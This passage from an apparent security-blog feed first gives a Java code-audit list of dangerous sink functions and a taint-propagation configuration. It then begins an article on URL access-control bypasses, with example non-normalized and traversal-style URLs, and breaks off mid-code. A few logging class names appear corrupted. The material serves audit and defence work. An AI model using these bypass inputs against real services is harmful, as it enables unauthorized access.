><td>org.apache.log4j.Logger</td><td>l7dlog</td><td></td></tr><tr><td>org.apache.log4j.Logger</td><td>warn</td><td></td></tr><tr><td>org.apache.log4j.Logger</td><td>trace</td><td></td></tr><tr><td>org.pmw.tinylog.Logger</td><td>debug</td><td></td></tr><tr><td>org.pmw.tinylog.Logger</td><td>error</td><td></td></tr><tr><td>org.pmw.tinylog.Logger</td><td>info</td><td></td></tr><tr><td>org.pmw.tinylog.Logger</td><td>warn</td><td></td></tr><tr><td>org.pmw.tinylog.Logger</td><td>trace</td></tr></tbody></table><h2 id="0x0D-任意URL跳转"><a href="#0x0D-任意URL跳转" class="headerlink" title="0x0D 任意URL跳转"></a>0x0D 任意URL跳转</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>javax.servlet.http.HttpServletResponse</td><td>sendRedirect</td><td>重定向</td></tr><tr><td>javax.servlet.RequestDispatcher</td><td>forward</td><td>可导致文件泄露</td></tr><tr><td>javax.servlet.RequestDispatcher</td><td>include</td><td>可导致文件泄露</td></tr></tbody></table><h2 id="0x0E-认证绕过"><a href="#0x0E-认证绕过" class="headerlink" title="0x0E 认证绕过"></a>0x0E 认证绕过</h2><p>解析获取URL时调用的函数：</p><table><thead><tr><th>类名</th><th>函数名</th></tr></thead><tbody><tr><td>javax.servlet.http.HttpServletRequest</td><td>getRequestURI</td></tr><tr><td>javax.servlet.http.HttpServletRequest</td><td>getRequestURL</td></tr></tbody></table><p>判断是否包含白名单URL时调用的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">contains</span><br><span class="line">indexOf</span><br><span class="line">startsWith</span><br><span class="line">endsWith</span><br></pre></td></tr></table></figure><h2 id="0x0F-SSTI"><a href="#0x0F-SSTI" class="headerlink" title="0x0F SSTI"></a>0x0F SSTI</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>freemarker.template.Template</td><td>getTemplate</td><td>FreeMarker</td></tr><tr><td>freemarker.template.Template</td><td>process</td><td>FreeMarker</td></tr><tr><td>org.apache.velocity.Template</td><td>merge</td><td>Velocity</td></tr></tbody></table><h2 id="0x10-反射调用任意类方法"><a href="#0x10-反射调用任意类方法" class="headerlink" title="0x10 反射调用任意类方法"></a>0x10 反射调用任意类方法</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>java.lang.reflect.Method</td><td>invoke</td><td></td></tr><tr><td>java.lang.reflect.InvocationHandler</td><td>invoke</td></tr></tbody></table><h2 id="0x11-远程连接"><a href="#0x11-远程连接" class="headerlink" title="0x11 远程连接"></a>0x11 远程连接</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>java.net.Socket</td><td>connect</td></tr></tbody></table><h2 id="0x12-SMTP头注入"><a href="#0x12-SMTP头注入" class="headerlink" title="0x12 SMTP头注入"></a>0x12 SMTP头注入</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>javax.mail.Message</td><td>setSubject</td><td></td></tr><tr><td>javax.mail.Message</td><td>addHeader</td><td></td></tr><tr><td>javax.mail.Message</td><td>setDescription</td><td></td></tr><tr><td>javax.mail.Message</td><td>setDisposition</td></tr></tbody></table><h2 id="0x13-自动绑定漏洞"><a href="#0x13-自动绑定漏洞" class="headerlink" title="0x13 自动绑定漏洞"></a>0x13 自动绑定漏洞</h2><table><thead><tr><th>类名</th><th>注解名</th><th>备注</th></tr></thead><tbody><tr><td>org.springframework.web.bind.annotation.ModelAttribute</td><td>@ModelAttribute</td><td>Spring MVC</td></tr><tr><td>org.springframework.web.bind.annotation.SessionAttributes</td><td>@SessionAttributes</td><td>Spring MVC</td></tr></tbody></table><h2 id="0x14-Beans注入"><a href="#0x14-Beans注入" class="headerlink" title="0x14 Beans注入"></a>0x14 Beans注入</h2><table><thead><tr><th>类名</th><th>函数名</th><th>备注</th></tr></thead><tbody><tr><td>org.apache.commons.beanutils.BeanUtils</td><td>populate</td><td></td></tr><tr><td>org.apache.commons.beanutils.BeanUtilsBean</td><td>populate</td></tr></tbody></table><h2 id="0x15-加解密相关"><a href="#0x15-加解密相关" class="headerlink" title="0x15 加解密相关"></a>0x15 加解密相关</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">java.sql.DriverManager  getConnection</span><br><span class="line">java.security.KeyStore$PasswordProtection  &lt;init&gt;</span><br><span class="line">org.springframework.security.oauth2.config.annotation.builders.ClientDetailsServiceBuilder$ClientBuilder  secret</span><br><span class="line">java.security.KeyStore  load</span><br><span class="line">javax.crypto.spec.PBEKeySpec  &lt;init&gt;</span><br><span class="line">java.net.PasswordAuthentication  &lt;init&gt;</span><br><span class="line">javax.security.auth.callback.PasswordCallback  setPassword</span><br><span class="line">javax.security.auth.kerberos.KerberosKey  &lt;init&gt;</span><br><span class="line">javax.net.ssl.KeyManagerFactory  init</span><br><span class="line">javax.crypto.spec.DESKeySpec  &lt;init&gt;</span><br><span class="line">javax.crypto.spec.DESedeKeySpec  &lt;init&gt;</span><br><span class="line">javax.crypto.spec.SecretKeySpec  &lt;init&gt;</span><br><span class="line">java.security.spec.X509EncodedKeySpec  &lt;init&gt;</span><br><span class="line">java.security.spec.PKCS8EncodedKeySpec  &lt;init&gt;</span><br><span class="line">java.security.KeyRep  &lt;init&gt;</span><br><span class="line">javax.security.auth.kerberos.KerberosTicket  &lt;init&gt;</span><br><span class="line">sun.security.provider.DSAPublicKeyImpl  &lt;init&gt;</span><br><span class="line">java.security.spec.DSAPrivateKeySpec  &lt;init&gt;</span><br><span class="line">java.security.spec.DSAPublicKeySpec  &lt;init&gt;</span><br><span class="line">javax.crypto.spec.DHPrivateKeySpec  &lt;init&gt;</span><br><span class="line">javax.crypto.spec.DHPublicKeySpec  &lt;init&gt; </span><br><span class="line">java.security.spec.ECPrivateKeySpec  &lt;init&gt;</span><br><span class="line">java.security.spec.RSAPrivateKeySpec  &lt;init&gt;</span><br><span class="line">java.security.spec.RSAMultiPrimePrivateCrtKeySpec  &lt;init&gt;</span><br><span class="line">java.security.spec.RSAPrivateCrtKeySpec  &lt;init&gt;</span><br><span class="line">java.security.spec.RSAPublicKeySpec  &lt;init&gt;</span><br></pre></td></tr></table></figure><h2 id="0x16-不安全配置"><a href="#0x16-不安全配置" class="headerlink" title="0x16 不安全配置"></a>0x16 不安全配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line">//collections</span><br><span class="line">java.util.Collection  add,addAll,contains,containsAll,clear,remove,removeAll,removeIf,retainAll,toArray</span><br><span class="line">java.util.Iterator  next</span><br><span class="line">java.util.List  add,addAll,get,indexOf,lastIndexOf,listIterator,remove,replaceAll,retainAll,set,sort,subList,toArray</span><br><span class="line">java.util.ListIterator  add,previous,set</span><br><span class="line">java.util.ArrayList  &lt;init&gt;</span><br><span class="line">java.util.concurrent.CopyOnWriteArrayList  &lt;init&gt;</span><br><span class="line">java.util.Queue  element,offer,peek,poll,remove</span><br><span class="line">java.util.Deque  addFirst,addLast,descendingIterator,getFirst,getLast,offerFirst,offerLast,peekFirst,peekLast,pollFirst,pollLast,pop,push,removeFirst,removeFirstOccurrence,removeLast,removeLastOccurrence</span><br><span class="line">java.util.ArrayDeque  &lt;init&gt;</span><br><span class="line">java.util.concurrent.ConcurrentLinkedDeque  &lt;init&gt;</span><br><span class="line">java.util.LinkedList  &lt;init&gt;,get,set</span><br><span class="line">java.util.Vector  &lt;init&gt;,add,addAll,addElement,copyInto,elementAt,elements,firstElement,insertElementAt,setElementAt,sort</span><br><span class="line">java.util.Stack  &lt;init&gt;,peek,pop,push,search</span><br><span class="line">java.util.Enumeration  nextElement</span><br><span class="line">java.util.Arrays  asList</span><br><span class="line">java.util.HashSet  &lt;init&gt;</span><br><span class="line">java.util.LinkedHashSet  &lt;init&gt;</span><br><span class="line">java.util.SortedSet  first,headSet,last,tailSet,subSet</span><br><span class="line">java.util.NavigableSet  ceiling,descendingIterator,descendingSet,floor,headSet,higher,lower,pollFirst,pollLast,subSet,tailSet</span><br><span class="line">java.util.TreeSet  &lt;init&gt;</span><br><span class="line">java.util.concurrent.ConcurrentSkipListSet  &lt;init&gt;</span><br><span class="line">java.util.concurrent.CopyOnWriteArraySet  &lt;init&gt;</span><br><span class="line">java.util.Map  clear,compute,computeIfAbsent,computeIfPresent,containsKey,containsValue,entrySet,forEach,get,getOrDefault,keySet,merge,put,putAll,putIfAbsent,remove,replace,replaceAll,values</span><br><span class="line">java.util.Map$Entry  getKey,getValue,setValue</span><br><span class="line">java.util.HashMap  &lt;init&gt;</span><br><span class="line">java.util.LinkedHashMap  &lt;init&gt;</span><br><span class="line">java.util.WeakHashMap  &lt;init&gt;</span><br><span class="line">java.util.IdentityHashMap  &lt;init&gt;</span><br><span class="line">java.util.TreeMap  &lt;init&gt;</span><br><span class="line">java.util.Dictionary  elements,get,keys,put,remove</span><br><span class="line">java.util.Hashtable  &lt;init&gt;</span><br><span class="line">java.util.Properties  &lt;init&gt;,getProperty,load,loadFromXML,propertyNames,setProperty,stringPropertyNames</span><br><span class="line">java.util.Collections  addAll,asLifoQueue,binarySearch,checkedCollection,checkedList,checkedMap,checkedNavigableMap,checkedNavigableSet,checkedQueue,checkedSet,checkedSortedMap,checkedSortedSet,copy,disjoint,emptyEnumeration,emptyIterator,emptyListIterator,emptyMap,emptyNavigableMap,emptyNavigableSet,emptySet,emptySortedMap,emptySortedSet,enumeration,fill,frequency,indexOfSubList,lastIndexOfSubList,list,max,min,nCopies,newSetFromMap,replaceAll,reverse,rotate,shuffle,singleton,singletonList,singletonMap,sort,swap,synchronizedCollection,synchronizedList,synchronizedMap,synchronizedNavigableMap,synchronizedNavigableSet,synchronizedSet,synchronizedSortedMap,synchronizedSortedSet,unmodifiableCollection,unmodifiableList,unmodifiableMap,unmodifiableNavigableMap,unmodifiableNavigableSet,unmodifiableSet,unmodifiableSortedMap,unmodifiableSortedSet</span><br><span class="line"></span><br><span class="line">//dropwizard</span><br><span class="line">io.dropwizard.servlets.Servlets  getFullUrl</span><br><span class="line"></span><br><span class="line">//guava</span><br><span class="line">com.google.common.base.Optional  or</span><br><span class="line"></span><br><span class="line">//java-ee</span><br><span class="line">javax.servlet.ServletRequest  getAttributeNames,getCharacterEncoding,getContentType,getLocalAddr,getLocalName,getParameter,getParameterMap,getParameterNames,getParameterValues,getProtocol,getRealPath,getRemoteAddr,getRemoteHost,getRequestDispatcher,getScheme,getServerName</span><br><span class="line">javax.servlet.http.HttpServletRequest  getAttributeNames,changeSessionId,getAuthType,getCharacterEncoding,getContentType,getContextPath,getCookies,getHeader,getHeaderNames,getHeaders,getLocalAddr,getLocalName,getMethod,getParameter,getParameterMap,getParameterNames,getParameterValues,getProtocol,getPathInfo,getPathTranslated,getQueryString,getRealPath,getRemoteAddr,getRemoteHost,getRemoteUser,getRequestDispatcher,getRequestURI,getRequestURL,getScheme,getServerName,getServletPath</span><br><span class="line">javax.servlet.http.HttpServletRequestWrapper  getAttributeNames,changeSessionId,getAuthType,getCharacterEncoding,getContentType,getContextPath,getCookies,getHeader,getHeaderNames,getHeaders,getLocalAddr,getLocalName,getMethod,getParameter,getParameterMap,getParameterNames,getParameterValues,getProtocol,getPathInfo,getPathTranslated,getQueryString,getRealPath,getRemoteAddr,getRemoteHost,getRemoteUser,getRequestDispatcher,getRequestURI,getRequestURL,getScheme,getServerName,getServletPath</span><br><span class="line">javax.servlet.ServletRequestWrapper  getAttributeNames,getCharacterEncoding,getContentType,getLocalAddr,getLocalName,getParameter,getParameterMap,getParameterNames,getParameterValues,getProtocol,getRealPath,getRemoteAddr,getRemoteHost,getRequestDispatcher,getScheme,getServerName</span><br><span class="line">javax.servlet.http.Cookie  getComment,getDomain,getName,getPath,getValue</span><br><span class="line">javax.servlet.ServletContext  getContextPath,getNamedDispatcher,getRequestDispatcher,getRealPath,getResource,getResourceAsStream,getResourcePaths</span><br><span class="line">javax.servlet.jsp.JspWriter  write,print,println</span><br><span class="line">org.apache.commons.fileupload.FileItem  getName</span><br><span class="line">javax.ws.rs.core.MultivaluedMap  getFirst</span><br><span class="line"></span><br><span class="line">//java-lang</span><br><span class="line">Ljava.lang  String;:#IMMUTABLE,Boolean;:SAFE#IMMUTABLE,Character;:SAFE#IMMUTABLE,Double;:SAFE#IMMUTABLE,Float;:SAFE#IMMUTABLE,Integer;:SAFE#IMMUTABLE,Long;:SAFE#IMMUTABLE,Byte;:SAFE#IMMUTABLE,Short;:SAFE#IMMUTABLE</span><br><span class="line">Ljava.io  File;:#IMMUTABLE</span><br><span class="line">Ljava.util  Locale;:#IMMUTABLE,Date;:SAFE#IMMUTABLE</span><br><span class="line">Ljava.net  Inet4Address;:#IMMUTABLE,Inet6Address;:#IMMUTABLE,InetSocketAddress;:#IMMUTABLE,URI;:#IMMUTABLE,URL;:#IMMUTABLE</span><br><span class="line">Ljava.math  BigInteger;:SAFE#IMMUTABLE,BigDecimal;:SAFE#IMMUTABLE</span><br><span class="line">Ljava.sql  Time;:SAFE#IMMUTABLE</span><br><span class="line">Ljava.time  Duration;:SAFE#IMMUTABLE,Instant;:SAFE#IMMUTABLE,LocalDate;:SAFE#IMMUTABLE,LocalDateTime;:SAFE#IMMUTABLE,LocalTime;:SAFE#IMMUTABLE,MonthDay;:SAFE#IMMUTABLE,OffsetDateTime;:SAFE#IMMUTABLE,OffsetTime;:SAFE#IMMUTABLE,Period;:SAFE#IMMUTABLE,Year;:SAFE#IMMUTABLE,YearMonth;:SAFE#IMMUTABLE,ZonedDateTime;:SAFE#IMMUTABLE,ZonedId;:SAFE#IMMUTABLE,ZoneOffset;:SAFE#IMMUTABLE</span><br><span class="line">Ljava.text  Format;:SAFE#IMMUTABLE,DateFormat;:SAFE#IMMUTABLE,SimpleDateFormat;:SAFE#IMMUTABLE,MessageFormat;:SAFE#IMMUTABLE,NumberFormat;:SAFE#IMMUTABLE,ChoiceFormat;:SAFE#IMMUTABLE,DecimalFormat;:SAFE#IMMUTABLE</span><br><span class="line">java.text.MessageFormat  format</span><br><span class="line">java.lang.Object  clone,equals,toString</span><br><span class="line">java.lang.Enum  name,toString</span><br><span class="line">java.lang.Iterable  forEach,iterator</span><br><span class="line">java.lang.System  clearProperty,getenv,getProperty,lineSeparator,setProperty</span><br><span class="line">java.lang.Appendable  append</span><br><span class="line">java.lang.StringBuilder  &lt;init&gt;,append,insert,delete,deleteCharAt,ensureCapacity,replace,reverse,substring,subSequence,trimToSize</span><br><span class="line">java.lang.StringBuffer  &lt;init&gt;,append,insert,delete,deleteCharAt,ensureCapacity,replace,reverse,substring,subSequence,trimToSize</span><br><span class="line">java.lang.String  &lt;init&gt;,concat,intern,format,join,replace,replaceAll,replaceFirst,split,substring,subSequence,toLowerCase,toUpperCase,trim,valueOf,getBytes</span><br><span class="line">java.util.Arrays  toString</span><br><span class="line">java.lang.CharSequence  subSequence</span><br><span class="line">java.lang.Boolean  toString</span><br><span class="line">java.lang.Character  getName,toString</span><br><span class="line">java.lang.Double  toString</span><br><span class="line">java.lang.Float  toHexString,toString</span><br><span class="line">java.lang.Integer  toBinaryString,toHexString,toOctalString,toString</span><br><span class="line">java.lang.Long  toBinaryString,toHexString,toOctalString,toString</span><br><span class="line">java.lang.Byte  toString</span><br><span class="line">java.lang.Short  toString</span><br><span class="line">java.math.BigDecimal  toEngineeringString,toPlainString,toString</span><br><span class="line">java.lang.reflect.Type  getTypeName</span><br><span class="line">java.lang.Class  getCanonicalName,getName,getResource,getSimpleName,toGenericString,toString,getResourceAsStream</span><br><span class="line">java.lang.ClassLoader  getResource,getResources,getSystemResource,getSystemResources</span><br><span class="line">java.lang.reflect.Member  getName</span><br><span class="line">java.lang.reflect.Executable  toGenericString</span><br><span class="line">java.lang.reflect.Method  toString</span><br><span class="line">java.lang.reflect.Constructor  toString</span><br><span class="line">java.lang.reflect.Field  toGenericString,toString</span><br><span class="line">java.lang.Package  getName,toString</span><br><span class="line">javax.xml.transform.stream.StreamSource  &lt;init&gt;</span><br><span class="line">java.io.FileInputStream  &lt;init&gt;</span><br><span class="line">java.io.ByteArrayInputStream  &lt;init&gt;</span><br><span class="line">java.util.ResourceBundle  getString,getStringArray,getObject</span><br><span class="line">kotlin.text.StringsKt  replace$default</span><br><span class="line">kotlin.text.Regex  replace,&lt;init&gt;</span><br><span class="line"></span><br><span class="line">//java-net</span><br><span class="line">java.net.URI  &lt;init&gt;,create,getAuthority,getFragment,getHost,getPath,getQuery,getRawAuthority,getRawFragment,getRawPath,getRawQuery,getRawSchemeSpecificPart,getRawUserInfo,getScheme,getSchemeSpecificPart,getUserInfo,normalize,parseServerAuthority,relativize,resolve,toASCIIString,toString,toURL</span><br><span class="line">java.net.URL  &lt;init&gt;,getAuthority,getContent,getFile,getHost,getPath,getProtocol,getQuery,getRef,getUserInfo,sameFile,toExternalForm,toString,toURI</span><br><span class="line">java.io.File  createTempFile,getCanonicalPath,separator:SAFE</span><br><span class="line">java.nio.file.FileSystem  getSeparator</span><br><span class="line"></span><br><span class="line">//jetty</span><br><span class="line">org.eclipse.jetty.http.HttpFields  getFieldNamesCollection,getFieldNames,getStringField,get,getCSV,getQualityCSV,getValues,valueParameters</span><br><span class="line">org.eclipse.jetty.http.HttpField  getName,getValue,getValues,toString</span><br><span class="line">org.eclipse.jetty.http.HttpCookie  getName,getValue,asString</span><br><span class="line">org.eclipse.jetty.http.HttpURI  getParam,getQuery,getHost</span><br><span class="line"></span><br><span class="line">//logging</span><br><span class="line">java.util.logging.Logger  entering,exiting,logp,logrb</span><br><span class="line">java.utilging.Logger  log</span><br><span class="line">org.apache.commons.logging.Log  debug,error,fatal,info,trace,warn</span><br><span class="line">org.slf4j.Logger  debug,error,info,trace,warn</span><br><span class="line">org.apache.logging.log4j.Logger  debug,entry,error,fatal,info,printf,trace,warn</span><br><span class="line">org.apacheging4j.Logger  log</span><br><span class="line">org.apache.log4j.Category  debug,error,fatal,info,l7dlog,warn</span><br><span class="line">org.apache4j.Category  log</span><br><span class="line">org.apache.log4j.Logger  debug,error,fatal,info,l7dlog,warn,trace</span><br><span class="line">org.apache4j.Logger  log</span><br><span class="line">org.pmw.tinylog.Logger  debug,error,info,trace,warn</span><br><span class="line">org.jboss.seam.log.Log  debug,error,fatal,info,trace,warn</span><br><span class="line"></span><br><span class="line">//other</span><br><span class="line">java.io.BufferedReader  readLine</span><br><span class="line">java.io.Console  readLine</span><br><span class="line">java.io.DataInputStream  readLine,readUTF</span><br><span class="line">java.io.LineNumberReader  readLine</span><br><span class="line">java.util.Scanner  &lt;init&gt;,next,nextLine</span><br><span class="line">java.sql.ResultSet  getNString,getString</span><br><span class="line">java.util.StringTokenizer  &lt;init&gt;,nextToken</span><br><span class="line">java.awt.TextComponent  getSelectedText,getText</span><br><span class="line">javax.swing.text.JTextComponent  getSelectedText,getText</span><br><span class="line">flexjson.JSONSerializer  deepSerialize,serialize</span><br><span class="line">javax.jdo.PersistenceManager  newQuery</span><br><span class="line"></span><br><span class="line">//portlet</span><br><span class="line">javax.portlet.PortletRequest  getPortletMode,getWindowState,getPreferences,getPortletSession,getPropertyNames,getPortalContext,getAuthType,getContextPath,getRemoteUser,getUserPrincipal,getAttributeNames,getParameter,getParameterMap,getParameterNames,getParameterValues,getRequestedSessionId,getResponseContentType,getResponseContentTypes,getLocale,getLocales,getScheme,getServerName,getWindowID,getCookies,getPrivateParameterMap,getPublicParameterMap</span><br><span class="line">javax.portlet.ActionRequest  getReader,getCharacterEncoding,getContentType</span><br><span class="line">javax.portlet.ClientDataRequest  getPortletInputStream,getReader,getCharacterEncoding,getContentType,getMethod</span><br><span class="line">javax.portlet.RenderRequest  getETag</span><br><span class="line">javax.portlet.ResourceRequest  getETag,getResourceID,getPrivateRenderParameterMap</span><br><span class="line">javax.portlet.PortletResponse  encodeURL,getNamespace</span><br><span class="line">javax.portlet.MimeResponse  createRenderURL,createActionURL,createResourceURL</span><br><span class="line">javax.portlet.RenderResponse  createRenderURL,createActionURL,getNamespace</span><br><span class="line">javax.portlet.ResourceResponse  createRenderURL,createActionURL,createResourceURL</span><br><span class="line">javax.portlet.BaseURL  setParameter,setParameters,addProperty,setProperty,toString</span><br><span class="line"></span><br><span class="line">//sonarqube</span><br><span class="line">org.sonarqube.ws.client.Parameters  getValue,getValues,getKeys</span><br><span class="line">org.sonarqube.ws.client.Headers  getValue,getNames</span><br><span class="line">org.sonarqube.ws.client.BaseRequest  getPath,getMediaType,getParams</span><br><span class="line">org.sonarqube.ws.client.WsRequest  getPath,getMediaType,getParams</span><br><span class="line"></span><br><span class="line">//struts2-taint</span><br><span class="line">org.apache.struts2.dispatcher.Parameter  getValue</span><br><span class="line">org.apache.struts2.util.StrutsUtil  buildUrl</span><br><span class="line"></span><br><span class="line">//taint-param-annotations</span><br><span class="line">org.springframework.web.bind.annotation  PathVariable,RequestParam,RequestBody,RequestHeader,MatrixVariable,RequestPart</span><br><span class="line">org.springframework.ws.server.endpoint.annotation  RequestPayload,XPathParam</span><br><span class="line">javax.ws.rs  PathParam,HeaderParam,MatrixParam,CookieParam,FormParam,QueryParam</span><br><span class="line"></span><br><span class="line">//taint-sensitive-data</span><br><span class="line">java.lang.System  getenv,getProperty</span><br><span class="line">com.typesafe.config.Config  getString</span><br><span class="line">play.api.Configuration  getString</span><br><span class="line"></span><br><span class="line">//tainted-system-variables</span><br><span class="line">java.lang.System  clearProperty,getenv,getProperty,setProperty</span><br><span class="line"></span><br><span class="line">//wicket</span><br><span class="line">org.apache.wicket.protocol.http.request.WebClientInfo  getUserAgent,getUserAgentStringLc,getRemoteAddr</span><br><span class="line">org.apache.wicket.request.http.WebRequest  getHeaders,getHeader</span><br><span class="line">org.apache.wicket.protocol.http.ClientProperties  getNavigatorAppCodeName,getNavigatorAppName,getNavigatorAppVersion,getNavigatorLanguage,getNavigatorPlatform,getNavigatorUserAgent,getRemoteAddress,getHostname</span><br><span class="line">org.apache.wicket.request.IRequestParameters  getParameterNames,getParameterValue,getParameterValues</span><br><span class="line">org.apache.wicket.protocol.http.servlet.ServletPartFileItem  getName,getFileName,get,getString,getInputStream</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>URL Bypass总结</title>
    <link href="https://www.mi1k7ea.com/2020/04/13/URL-Bypass%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/04/13/URL-Bypass总结/</id>
    <published>2020-04-13T13:43:27.000Z</published>
    <updated>2020-04-17T13:43:13.413Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-利用Spring-MVC框架特性绕过访问控制（suffix-pattern）"><a href="#0x01-利用Spring-MVC框架特性绕过访问控制（suffix-pattern）" class="headerlink" title="0x01 利用Spring MVC框架特性绕过访问控制（suffix-pattern）"></a>0x01 利用Spring MVC框架特性绕过访问控制（suffix-pattern）</h2><p>在Spring MVC框架中，如果使用<code>@RequestMapping</code>注解来匹配URL，当启用后缀匹配模式（suffix-pattern为true）时，URL加任意后缀都能访问到对应的接口。</p><p>例如，构造形如<code>/abc/def.xx</code>的URL，也能够正确匹配到<code>@RequestMapping</code>中定义的方法（<code>/abc/def</code>）。因此可以利用这个特性绕过某些访问控制。</p><h2 id="0x02-利用非标准化绕过（-）"><a href="#0x02-利用非标准化绕过（-）" class="headerlink" title="0x02 利用非标准化绕过（.\/）"></a>0x02 利用非标准化绕过（.\/）</h2><p>假设原始访问URL为<code>http://www.mi1k7ea.com/urltest/index.jsp</code>，则如下URL也能成功解析得到一样的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://www.mi1k7ea.com/login/../urltest/index.jsp</span><br><span class="line">http://www.mi1k7ea.com/./urltest/index.jsp</span><br><span class="line">http://www.mi1k7ea.com///urltest/index.jsp</span><br><span class="line">http://www.mi1k7ea.com\urltest/index.jsp</span><br><span class="line">http://www.mi1k7ea.com\\\urltest/index.jsp</span><br><span class="line">http://www.mi1k7ea.com/\./urltest/index.jsp</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><strong>Demo</strong></p><p>这里直接修改<a href="https://xz.aliyun.com/t/7544#toc-11" target="_blank" rel="noopener">《Tomcat URL解析差异性导致的安全问题》</a>中的Demo即可，改的doFilter()的处理逻辑，同时应用了startsWith()和endsWith()来判断鉴权：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 